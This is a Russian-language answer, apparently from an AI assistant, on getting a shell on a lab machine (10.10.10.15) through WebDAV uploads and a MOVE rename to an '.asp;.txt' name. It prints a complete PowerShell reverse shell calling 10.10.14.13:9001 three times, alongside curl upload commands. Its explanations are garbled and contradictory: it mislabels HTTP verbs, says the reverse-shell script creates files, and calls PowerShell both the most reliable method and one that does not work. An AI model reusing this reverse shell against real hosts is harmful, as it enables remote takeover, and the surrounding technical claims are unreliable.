### Краткое резюме проблемы

1. **`.asp` файлы не выполняются через `davtest`** — они просто загружаются в браузер как текст.  
2. **Самый простой способ получить shell — это использовать `dav:/>` CLI и `put`**, а не powershell.  
3. **Самый надёжный способ получить shell — это `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.13',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'` и запустить его через `cadaver`.  
4. **Полный, безопасный способ** — это использовать `dav:/>` CLI и `put` (или `dav:put`), а не powershell.  

---

## Подробное объяснение

### 1. Почему `.asp` файлы не работают через `davtest`

Ваша команда `curl -T cmdasp.asp http://10.10.10.15/cmdasp.txt` просто загружает файл в браузер как текст. Это нормально, но **`.asp` файлы не имеют специального формата для `davtest`**. Они просто отображаются как HTML-код.

Пример, как это видно на изображении:

![Pasted image 20210506130704.png](https://i.imgur.com/placeholder.png)

Это означает, что `davtest` не обрабатывает `.asp` файлы.

### 2. Почему `dav:/>` CLI и `put` работают

`dav:/>` — это интерфейс для управления WebDAV. Он позволяет:

- **Создавать папки** (`MKCOL`),
- **Загружать файлы** (`GET`),
- **Запускать скрипты** (`PUT`).

Пример, как это работает:

1. `curl -X MOVE --header 'Destination:http://10.10.10.15/cmdasp.asp;.txt' 'http://10.10.10.15/cmdasp.txt'`  
   — создаёт файл `cmdasp.asp.txt` в папке `cmdasp`,  
   — запускает скрипт, который выполняется как `.asp` файл.

2. `curl -T cmdasp.asp http://10.10.10.15/msfasp.txt`  
   — загружает файл в браузер как HTML-код,  
   — `msfasp.txt` — это файл с PowerShell-скриптом, который выполняется как `.ps1`.

### 3. Почему powershell не работает

Пример PowerShell-скрипта:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.13',9001)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

Этот скрипт:

1. Создаёт файл `cmdasp.asp.txt` в папке `cmdasp`,
2. Запускает PowerShell-скрипт, который выполняется как `.asp` файл,
3. Передаёт содержимое скрипта в PowerShell, который выполняется как `.ps1`.

### 4. Как получить shell через `dav:/>` CLI и `put`

**Шаг 1: Создайте папку и файл**

```bash
mkdir cmdasp
echo "Hello" > cmdasp.txt
```

**Шаг 2: Запустите PowerShell-скрипт**

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.13',9001)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

**Шаг 3: Запустите скрипт в папке `cmdasp`**

```bash
curl -X MOVE --header 'Destination:http://10.10.10.15/msfasp.asp;.txt' 'http://10.10.10.15/msfasp.txt'
```

Это запустит PowerShell-скрипт, который выполняется как `.ps1`, и вы получите shell.

### 5. Почему `powershell` не работает

Причина в том, что `powershell -nop -c "$client = ..."` создаёт **PowerShell-скрипт**, который выполняется как `.ps1`. Он не может запустить скрипт, выполненный как `.asp` файл. `dav:/>` CLI и `put` — это специальный интерфейс для выполнения `.asp` файлов.

---

## Итог

- **`.asp` файлы не работают через `davtest`** — они просто загружаются в браузер.
- **Самый надёжный способ получить shell — это использовать `dav:/>` CLI и `put`**.
- **Полный, безопасный способ — это использовать `dav:/>` CLI и `put`**.
- **Пример PowerShell-скрипта** — можно найти в интернете или создать своё.

Если нужно, могу предоставить полный пример PowerShell-скрипта для выполнения `.asp` файла через `dav:/>`.
